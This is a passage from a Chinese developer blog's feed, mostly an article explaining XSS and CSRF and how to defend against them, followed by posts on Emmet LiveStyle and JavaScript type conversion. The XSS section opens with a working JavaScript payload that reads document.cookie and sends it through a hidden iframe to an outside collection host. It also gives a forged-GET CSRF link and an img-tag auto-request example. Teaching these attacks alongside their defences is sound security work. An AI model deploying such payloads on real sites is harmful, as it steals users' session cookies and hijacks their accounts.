&lt;figure class=&quot;highlight typescript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 用 &amp;lt;script type=&quot;text/javascript&quot;&amp;gt;&amp;lt;/script&amp;gt; 包起来放在评论中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 构造泄露信息用的 URL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; cookies = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.cookie;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; xssURIBase = &lt;span class=&quot;string&quot;&gt;&quot;http://192.168.123.123/myxss/&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; xssURI = xssURIBase + &lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;.encodeURI(cookies);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 建立隐藏 iframe 用于通讯&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; hideFrame = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.createElement(&lt;span class=&quot;string&quot;&gt;&quot;iframe&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    hideFrame.height = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    hideFrame.width = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    hideFrame.style.display = &lt;span class=&quot;string&quot;&gt;&quot;none&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    hideFrame.src = xssURI;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 开工&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.body.appendChild(hideFrame);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;)(&lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;于是每个访问到含有该评论的页面的用户都会遇到麻烦——他们不知道背后正悄悄的发起了一个请求，是他们所看不到的。而这个请求，会把包含了他们的帐号和其他隐私的信息发送到收集服务器上。&lt;br&gt;我们知道 AJAX 技术所使用的 XMLHttpRequest 对象都被浏览器做了限制，只能访问当前域名下的 URL，所谓不能“跨域”问题。这种做法的初衷也是防范 XSS，多多少少都起了一些作用，但不是总是有用，正如上面的注入代码，用 iframe 也一样可以达到相同的目的。甚至在愿意的情况下，我还能用 iframe 发起 POST 请求。当然，现在一些浏览器能够很智能地分析出部分 XSS 并予以拦截，例如新版的 Firefox、Chrome 都能这么做。但拦截不总是能成功，何况这个世界上还有大量根本不知道什么是浏览器的用户在用着可怕的 IE6。从原则上将，我们也不应该把事关安全性的责任推脱给浏览器，所以防止 XSS 的根本之道还是过滤用户输入。用户输入总是不可信任的，这点对于 Web 开发者应该是常识。&lt;br&gt;正如上文所说，如果我们不需要用户输入 HTML 而只想让他们输入纯文本，那么把所有用户输入进行 HTML 转义输出是个不错的做法。似乎很多 Web 开发框架、模版引擎的开发者也发现了这一点，Django 内置模版和 Jinja2 模版总是默认转义输出变量的。如果没有使用它们，我们自己也可以这么做。PHP 可以用 htmlspecialchars 函数，Python 可以导入 cgi 模块用其中的 cgi.escape 函数。如果使用了某款模版引擎，那么其必自带了方便快捷的转义方式。&lt;br&gt;真正麻烦的是，在一些场合我们要允许用户输入 HTML，又要过滤其中的脚本。Tidy 等 HTML 清理库可以帮忙，但前提是我们小心地使用。仅仅粗暴地去掉 script 标签是没有用的，任何一个合法 HTML 标签都可以添加 onclick 一类的事件属性来执行 JavaScript。对于复杂的情况，我个人更倾向于使用简单的方法处理，简单的方法就是白名单重新整理。用户输入的 HTML 可能拥有很复杂的结构，但我们并不将这些数据直接存入数据库，而是使用 HTML 解析库遍历节点，获取其中数据（之所以不使用 XML 解析库是因为 HTML 要求有较强的容错性）。然后根据用户原有的标签属性，重新构建 HTML 元素树。构建的过程中，所有的标签、属性都只从白名单中拿取。这样可以确保万无一失——如果用户的某种复杂输入不能为解析器所识别（前面说了 HTML 不同于 XML，要求有很强的容错性），那么它不会成为漏网之鱼，因为白名单重新整理的策略会直接丢弃掉这些未能识别的部分。最后获得的新 HTML 元素树，我们可以拍胸脯保证——所有的标签、属性都来自白名单，一定不会遗漏。&lt;br&gt;现在看来，大多数 Web 开发者都了解 XSS 并知道如何防范，往往大型的 XSS 攻击（包括前段时间新浪微博的 XSS 注入）都是由于疏漏。我个人建议在使用模版引擎的 Web 项目中，开启（或不要关闭）类似 Django Template、Jinja2 中“默认转义”（Auto Escape）的功能。在不需要转义的场合，我们可以用类似 的方式取消转义。这种白名单式的做法，有助于降低我们由于疏漏留下 XSS 漏洞的风险。&lt;br&gt;另外一个风险集中区域，是富 AJAX 类应用（例如豆瓣网的阿尔法城）。这类应用的风险并不集中在 HTTP 的静态响应内容，所以不是开启模版自动转义能就能一劳永逸的。再加上这类应用往往需要跨域，开发者不得不自己打开危险的大门。这种情况下，站点的安全非常 依赖开发者的细心和应用上线前有效的测试。现在亦有不少开源的 XSS 漏洞测试软件包（似乎有篇文章提到豆瓣网的开发也使用自动化 XSS 测试），但我都没试用过，故不予评价。不管怎么说，我认为从用户输入的地方把好关总是成本最低而又最有效的做法。&lt;/p&gt;
&lt;h3 id=&quot;CSRF：冒充用户之手&quot;&gt;&lt;a href=&quot;#CSRF：冒充用户之手&quot; class=&quot;headerlink&quot; title=&quot;CSRF：冒充用户之手&quot;&gt;&lt;/a&gt;CSRF：冒充用户之手&lt;/h3&gt;&lt;p&gt;起初我一直弄不清楚 CSRF 究竟和 XSS 有什么区别，后来才明白 CSRF 和 XSS 根本是两个不同维度上的分类。XSS 是实现 CSRF 的诸多途径中的一条，但绝对不是唯一的一条。一般习惯上把通过 XSS 来实现的 CSRF 称为 XSRF。&lt;br&gt;CSRF 的全称是“跨站请求伪造”，而 XSS 的全称是“跨站脚本”。看起来有点相似，它们都是属于跨站攻击——不攻击服务器端而攻击正常访问网站的用户，但前面说了，它们的攻击类型是不同维度上的分 类。CSRF 顾名思义，是伪造请求，冒充用户在站内的正常操作。我们知道，绝大多数网站是通过 cookie 等方式辨识用户身份（包括使用服务器端 Session 的网站，因为 Session ID 也是大多保存在 cookie 里面的），再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。&lt;br&gt;严格意义上来说，CSRF 不能分类为注入攻击，因为 CSRF 的实现途径远远不止 XSS 注入这一条。通过 XSS 来实现 CSRF 易如反掌，但对于设计不佳的网站，一条正常的链接都能造成 CSRF。&lt;br&gt;例如，一论坛网站的发贴是通过 GET 请求访问，点击发贴之后 JS 把发贴内容拼接成目标 URL 并访问：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://example.com/bbs/create_post.php?title=标题&amp;amp;content=内容
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;那么，我只需要在论坛中发一帖，包含一链接：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://example.com/bbs/create_post.php?title=我是脑残&amp;amp;content=哈哈
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;只要有用户点击了这个链接，那么他们的帐户就会在不知情的情况下发布了这一帖子。可能这只是个恶作剧，但是既然发贴的请求可以伪造，那么删帖、转帐、改密码、发邮件全都可以伪造。&lt;br&gt;如何解决这个问题，我们是否可以效仿上文应对 XSS 的做法呢？过滤用户输入， 不允许发布这种含有站内操作 URL 的链接。这么做可能会有点用，但阻挡不了 CSRF，因为攻击者可以通过 QQ 或其他网站把这个链接发布上去，为了伪装可能还使用 bit.ly 压缩一下网址，这样点击到这个链接的用户还是一样会中招。所以对待 CSRF ，我们的视角需要和对待 XSS 有所区别。CSRF 并不一定要有站内的输入，因为它并不属于注入攻击，而是请求伪造。被伪造的请求可以是任何来源，而非一定是站内。所以我们唯有一条路可行，就是过滤请求的 处理者。&lt;br&gt;比较头痛的是，因为请求可以从任何一方发起，而发起请求的方式多种多样，可以通过 iframe、ajax（这个不能跨域，得先 XSS）、Flash 内部发起请求（总是个大隐患）。由于几乎没有彻底杜绝 CSRF 的方式，我们一般的做法，是以各种方式提高攻击的门槛。&lt;br&gt;首先可以提高的一个门槛，就是改良站内 API 的设计。对于发布帖子这一类创建资源的操作，应该只接受 POST 请求，而 GET 请求应该只浏览而不改变服务器端资源。当然，最理想的做法是使用 REST 风格 的 API 设计，GET、POST、PUT、DELETE 四种请求方法对应资源的读取、创建、修改、删除。现在的浏览器基本不支持在表单中使用 PUT 和 DELETE 请求方法，我们可以使用 ajax 提交请求（例如通过 jquery-form 插件，我最喜欢的做法），也可以使用隐藏域指定请求方法，然后用 POST 模拟 PUT 和 DELETE （Ruby on Rails 的做法）。这么一来，不同的资源操作区分的非常清楚，我们把问题域缩小到了非 GET 类型的请求上——攻击者已经不可能通过发布链接来伪造请求了，但他们仍可以发布表单，或者在其他站点上使用我们肉眼不可见的表单，在后台用 js 操作，伪造请求。&lt;br&gt;接下来我们就可以用比较简单也比较有效的方法来防御 CSRF，这个方法就是“请求令牌”。读过《J2EE 核心模式》的同学应该对“同步令牌”应该不会陌生，“请求令牌”和“同步令牌”原理是一样的，只不过目的不同，后者是为了解决 POST 请求重复提交问题，前者是为了保证收到的请求一定来自预期的页面。实现方法非常简单，首先服务器端要以某种策略生成随机字符串，作为令牌（token）， 保存在 Session 里。然后在发出请求的页面，把该令牌以隐藏域一类的形式，与其他信息一并发出。在接收请求的页面，把接收到的信息中的令牌与 Session 中的令牌比较，只有一致的时候才处理请求，否则返回 HTTP 403 拒绝请求或者要求用户重新登陆验证身份。&lt;br&gt;请求令牌虽然使用起来简单，但并非不可破解，使用不当会增加安全隐患。使用请求令牌来防止 CSRF 有以下几点要注意：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;虽然请求令牌原理和验证码有相似之处，但不应该像验证码一样，全局使用一个 Session Key。因为请求令牌的方法在理论上是可破解的，破解方式是解析来源页面的文本，获取令牌内容。如果全局使用一个 Session Key，那么危险系数会上升。原则上来说，每个页面的请求令牌都应该放在独立的 Session Key 中。我们在设计服务器端的时候，可以稍加封装，编写一个令牌工具包，将页面的标识作为 Session 中保存令牌的键。&lt;/li&gt;
&lt;li&gt;在 ajax 技术应用较多的场合，因为很有请求是 JavaScript 发起的，使用静态的模版输出令牌值或多或少有些不方便。但无论如何，请不要提供直接获取令牌值的 API。这么做无疑是锁上了大门，却又把钥匙放在门口，让我们的请求令牌退化为同步令牌。&lt;/li&gt;
&lt;li&gt;第一点说了请求令牌理论上是可破解的，所以非常重要的场合，应该考虑使用验证码（令牌的一种升级，目前来看破解难度极大），或者要求用户再次输入密码（亚马逊、淘宝的做法）。但这两种方式用户体验都不好，所以需要产品开发者权衡。&lt;/li&gt;
&lt;li&gt;无论是普通的请求令牌还是验证码，服务器端验证过一定记得销毁。忘记销毁用过的令牌是个很低级但是杀伤力很大的错误。我们学校的选课系统就有这个 问题，验证码用完并未销毁，故只要获取一次验证码图片，其中的验证码可以在多次请求中使用（只要不再次刷新验证码图片），一直用到 Session 超时。这也是为何选课系统加了验证码，外挂软件升级一次之后仍然畅通无阻。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如下也列出一些据说能有效防范 CSRF，其实效果甚微的方式甚至无效的做法。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过 referer 判定来源页面：referer 是在 HTTP Request Head 里面的，也就是由请求的发送者决定的。如果我喜欢，可以给 referer 任何值。当然这个做法并不是毫无作用，起码可以防小白。但我觉得性价比不如令牌。&lt;/li&gt;
&lt;li&gt;过滤所有用户发布的链接：这个是最无效的做法，因为首先攻击者不一定要从站内发起请求（上面提到过了），而且就算从站内发起请求，途径也远远不知链接一条。比如 &lt;img src=&quot;./create_post.php&quot;&gt; 就是个不错的选择，还不需要用户去点击，只要用户的浏览器会自动加载图片，就会自动发起请求。 *在请求发起页面用 alert 弹窗提醒用户：这个方法看上去能干扰站外通过 iframe 发起的 CSRF，但攻击者也可以考虑用 window.alert = function(){}; 把 alert 弄哑，或者干脆脱离 iframe，使用 Flash 来达到目的。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;总体来说，目前防御 CSRF 的诸多方法还没几个能彻底无解的。所以 CSDN 上看到讨论 CSRF 的文章，一般都会含有“无耻”二字来形容（另一位有该名号的貌似是 DDOS 攻击）。作为开发者，我们能做的就是尽量提高破解难度。当破解难度达到一定程度，网站就逼近于绝对安全的位置了（虽然不能到达）。上述请求令牌方法，就我 认为是最有可扩展性的，因为其原理和 CSRF 原理是相克的。CSRF 难以防御之处就在于对服务器端来说，伪造的请求和正常的请求本质上是一致的。而请求令牌的方法，则是揪出这种请求上的唯一区别——来源页面不同。我们还可 以做进一步的工作，例如让页面中 token 的 key 动态化，进一步提高攻击者的门槛。本文只是作者个人认识的一个总结，便不讨论过深了。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;在那个年代，大家一般用拼接字符串的方式来构造动态 SQL 语句创建应用，于是 SQL 注入成了很流行的攻击方式。在这个年代， 参数化查询 已经成了普遍用法，我们已经离 SQL 注入很远了。但是，历史同样悠久的 XSS 和 CSRF 却没有远离我们。由于之前已经对 XSS 很熟悉了，所以我对用户输入的数据一直非常小心。如果输入的时候没有经过 Tidy 之类的过滤，我一定会在模板输出时候全部转义。所以个人感觉，要避免 XSS 也是很容易的，重点是要“小心”。但最近又听说了另一种跨站攻击 CSRF ，于是找了些资料了解了一下，并与 XSS 放在一起做个比较。&lt;br&gt;
    
    </summary>
    
    
      <category term="security" scheme="http://summerGreenTea.github.io/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>Emmet LiveStyle 实现浏览器和编辑器样式同步</title>
    <link href="http://summerGreenTea.github.io/2016/03/05/livestyle-plugin/"/>
    <id>http://summerGreenTea.github.io/2016/03/05/livestyle-plugin/</id>
    <published>2016-03-05T05:23:48.000Z</published>
    <updated>2016-03-05T05:52:14.404Z</updated>
    
    <content type="html">&lt;p&gt;相信大家都有使用编辑器开发CSS的经验，经常遇到的情况是，我们需要在编辑器修改后，保存，再到浏览器里查看效果，可是往往有的时候我们是反向操作的，即，在浏览器里修改CSS，直接看到效果，但是如果自动能把修改映射到编辑里，将是一个非常有帮助并且极大提高工作效率的事情，在今天这篇文章里，我将介绍强大的Emmet LiveStyle.&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;主要特性&quot;&gt;&lt;a href=&quot;#主要特性&quot; class=&quot;headerlink&quot; title=&quot;主要特性&quot;&gt;&lt;/a&gt;主要特性&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;实时更新：输入即可看到效果，无须保存，也无须重新加载&lt;/li&gt;
&lt;li&gt;不需要本地文件&lt;/li&gt;
&lt;li&gt;跨平台&lt;/li&gt;
&lt;li&gt;多视图多设备支持&lt;/li&gt;
&lt;li&gt;多站支持&lt;/li&gt;
&lt;li&gt;安装简单&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;安装Sublime-Text插件&quot;&gt;&lt;a href=&quot;#安装Sublime-Text插件&quot; class=&quot;headerlink&quot; title=&quot;安装Sublime Text插件&quot;&gt;&lt;/a&gt;安装Sublime Text插件&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;打开命令面板：ctrl + shift + p&lt;/li&gt;
&lt;li&gt;输入：install Package&lt;/li&gt;
&lt;li&gt;搜索：LiveStyle&lt;/li&gt;
&lt;/ol&gt;
&lt;img src=&quot;/2016/03/05/livestyle-plugin/livestyle.png&quot; alt=&quot;livestyle.png&quot; title=&quot;&quot;&gt;
&lt;p&gt;注：LiveStyle和Emmet一样，需要PyV8插件的支持。建议先安装Emmet，因为安装Emmet的同时会自动安装PyV8。&lt;/p&gt;
&lt;h3 id=&quot;安装chrome-plugin&quot;&gt;&lt;a href=&quot;#安装chrome-plugin&quot; class=&quot;headerlink&quot; title=&quot;安装chrome plugin&quot;&gt;&lt;/a&gt;安装chrome plugin&lt;/h3&gt;&lt;p&gt;你可以再chrome的应用商店搜索下载 &lt;strong&gt;Emmet LiveStyle&lt;/strong&gt;这个插件，但是考虑到天朝的墙的问题，很多同学无法访问到Chrome的应用商店。大家可以在这个国内的一个网站叫&lt;a href=&quot;http://www.cnplugins.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;插件网&lt;/a&gt;去下载，然后按照&lt;a href=&quot;http://www.cnplugins.com/tools/how-to-setup-crx.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这个网站&lt;/a&gt;的提示步骤去安装好久OK了。&lt;/p&gt;
&lt;p&gt;安装好后，我们可以在chrome的右上角看到图下的标志，此时它是关闭的。&lt;br&gt;&lt;img src=&quot;/2016/03/05/livestyle-plugin/chrome.png&quot; alt=&quot;chrome.png&quot; title=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;如何使用&quot;&gt;&lt;a href=&quot;#如何使用&quot; class=&quot;headerlink&quot; title=&quot;如何使用&quot;&gt;&lt;/a&gt;如何使用&lt;/h3&gt;&lt;p&gt;在Sublime Text里面打开我们的项目，然后选择我们的静态页面，在Chrome中运行。&lt;/p&gt;
&lt;p&gt;点击Chrome右上角的LiveStyle的图标，将其打开，就可以发现如下图所示：&lt;br&gt;&lt;img src=&quot;/2016/03/05/livestyle-plugin/code.png&quot; alt=&quot;code.png&quot; title=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后我们就是愉快的在编辑器中写代码了。&lt;br&gt;So easy了~~ ，再多一个字我都不愿意在介绍下去。  &lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;相信大家都有使用编辑器开发CSS的经验，经常遇到的情况是，我们需要在编辑器修改后，保存，再到浏览器里查看效果，可是往往有的时候我们是反向操作的，即，在浏览器里修改CSS，直接看到效果，但是如果自动能把修改映射到编辑里，将是一个非常有帮助并且极大提高工作效率的事情，在今天这篇文章里，我将介绍强大的Emmet LiveStyle.&lt;br&gt;
    
    </summary>
    
    
      <category term="tools" scheme="http://summerGreenTea.github.io/tags/tools/"/>
    
      <category term="plugins" scheme="http://summerGreenTea.github.io/tags/plugins/"/>
    
      <category term="css" scheme="http://summerGreenTea.github.io/tags/css/"/>
    
  </entry>
  
  <entry>
    <title>javascript的类型转换</title>
    <link href="http://summerGreenTea.github.io/2016/01/25/javascript-type-conversion/"/>
    <id>http://summerGreenTea.github.io/2016/01/25/javascript-type-conversion/</id>
    <published>2016-01-25T08:37:04.000Z</published>
    <updated>2016-03-02T02:58:00.279Z</updated>
    
    <content type="html">&lt;p&gt;javascript中的数值类型转换非常灵活，这要归咎于它是一门弱类型语言，从被一设计出来就对取值类型不敏感。松散的数据类型给js带来了很大的灵活性，但是与之而来的问题也有很多…&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;javascript将根据需要自行转换类型的值，常见的情况有对原始数据类型进行Boolean值转化，数字到字符串之间的转换等等。那么这些转换的规则在某种程度来说，有一定的规则可循。&lt;/p&gt;
&lt;h3 id=&quot;类型转化规则和注意点&quot;&gt;&lt;a href=&quot;#类型转化规则和注意点&quot; class=&quot;headerlink&quot; title=&quot;类型转化规则和注意点&quot;&gt;&lt;/a&gt;类型转化规则和注意点&lt;/h3&gt;&lt;p&gt;我们看下下面的代码:&lt;br&gt;&lt;figure class=&quot;highlight actionscript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt; + &lt;span class=&quot;string&quot;&gt;&#39;is seven&#39;&lt;/span&gt;   &lt;span class=&quot;comment&quot;&gt;// =&amp;gt; &#39;7 is seven&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt; - &lt;span class=&quot;string&quot;&gt;&#39;one&#39;&lt;/span&gt;       &lt;span class=&quot;comment&quot;&gt;// =&amp;gt; NaN&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;!&lt;span class=&quot;string&quot;&gt;&#39;hello&#39;&lt;/span&gt;         &lt;span class=&quot;comment&quot;&gt;// =&amp;gt; false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;它们都是不同类型之间的运算或转换。它们的转化规则如下:&lt;br&gt;&lt;img src=&quot;/2016/01/25/javascript-type-conversion/jyct.jpg&quot; alt=&quot;图片来自《javascript权威指南》&quot; title=&quot;图片来自《javascript权威指南》&quot;&gt;&lt;br&gt;其中的一些转换规则我们需要特别注意:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;当字符串转化为数字的时候，那些以数字表示的字符串可以转化为数字，也允许字符串前后也可以存在空格，其他的情况得到的转化结果都将为&lt;strong&gt;NaN&lt;/strong&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;而&lt;strong&gt;true&lt;/strong&gt;和&lt;strong&gt;false&lt;/strong&gt;转化为数字后的值为1和0。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;undefined、null、0、’’、NaN转化为Boolean的值都为false，也有些人称这些值为”假值”。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;+&lt;/strong&gt;在JS中有两种用法，一种是&lt;strong&gt;一元加&lt;/strong&gt;，做为一元运算符，主要作为将某种数据类型转为数值类型，比如: &lt;code&gt;+&amp;quot;46&amp;quot;&lt;/code&gt;;另一种用法是作为&lt;strong&gt;加号&lt;/strong&gt;，做字符串连接和计算数值相加之用。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;显式类型转化和隐式类型转化&quot;&gt;&lt;a href=&quot;#显式类型转化和隐式类型转化&quot; class=&quot;headerlink&quot; title=&quot;显式类型转化和隐式类型转化&quot;&gt;&lt;/a&gt;显式类型转化和隐式类型转化&lt;/h3&gt;&lt;p&gt;两种类型转化从叫法上就可以听出是从类型转化是否”明显、清晰”来判断的。&lt;br&gt;在JS中，显式类型转化通常就是调用原生构造函数来实现:&lt;br&gt;&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;Number&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;string&quot;&gt;&#39;3&#39;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;  &lt;span class=&quot;comment&quot;&gt;// =&amp;gt; 3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(undefined)&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;// =&amp;gt; &quot;undefined&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;Boolean&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt; =&amp;gt; true&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;而隐式类型转化通常都是通过一些运算符来实现的。上面提到的&lt;strong&gt;一元加&lt;/strong&gt;，就是一种隐式类型转换的产生方式。&lt;/p&gt;
&lt;h3 id=&quot;对象转化为原始值&quot;&gt;&lt;a href=&quot;#对象转化为原始值&quot; class=&quot;headerlink&quot; title=&quot;对象转化为原始值&quot;&gt;&lt;/a&gt;对象转化为原始值&lt;/h3&gt;&lt;p&gt;对象转化为原始值无非就是三种: String、Number和Boolean。对象转化为Boolean想对简单，直接都转化为true。我们要分析的是对象转化为String和Number。&lt;/p&gt;
&lt;h4 id=&quot;toString-和valueOf-方法&quot;&gt;&lt;a href=&quot;#toString-和valueOf-方法&quot; class=&quot;headerlink&quot; title=&quot;toString()和valueOf()方法&quot;&gt;&lt;/a&gt;toString()和valueOf()方法&lt;/h4&gt;&lt;p&gt;toString方法是返回一个反映该对象的字符串，而valueOf返回该对象的原始值的表示形式。JS中的对象都有toString()这个方法，因为所有的JS引用类型的对象都继承自Object这个对象。Object的toString()方法返回的是”[object 对象构造函数名]”的形式。很多对象都重写了Object上的toString()方法。数组的toString()返回一个数组元素之间加逗号组成的字符串;函数则返回这个函数的实现定义方式;日期类返还一个可读的日期和时间字符串。&lt;/p&gt;
&lt;figure class=&quot;highlight scheme&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;[&lt;span class=&quot;name&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;].toString() // =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;2,3,5&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;name&quot;&gt;x&lt;/span&gt;) 